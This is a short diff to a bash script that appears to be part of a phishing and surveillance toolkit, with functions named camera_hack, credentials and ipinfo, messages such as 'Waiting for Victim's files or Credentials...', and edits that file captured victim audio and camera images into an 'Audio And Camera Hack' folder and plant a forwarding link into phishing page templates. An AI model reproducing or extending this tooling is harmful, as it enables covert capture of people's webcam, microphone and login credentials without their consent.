@@ -723,8 +723,7 @@ echo ""
 msg "Waiting for Victim's files or Credentials..."
 }
 snt() {
-mv *.wav $files/Audio\ And\ Camera\ Hack &> /dev/null
-mv cam* $files/Audio\ And\ Camera\ Hack &> /devnull
+mv *.wav $files/Audio\ And\ Camera\ Hack &> /dev/null;mv *.png $files/Audio\ And\ Camera\ Hack &> /devnull
 }
 function ipinfo() {
 	echo
@@ -841,8 +840,7 @@ function camera_hack() {
 		cp -R * .drk/
 		cd .drk/ && rm -rf .drk/
                 prt
-		sed 's+forwarding_link+'$link'+g' ${source} > index2.html;sed 's+forwarding_link+'$link'+g' template.
-php > index.php
+		sed 's+forwarding_link+'$link'+g' ${source} > index2.html;sed 's+forwarding_link+'$link'+g' template.php > index.php
 		credentials
 			sleep 0.5
 			print=$(printf "\n${green}[${white}+${green}] Cam file received!\n")
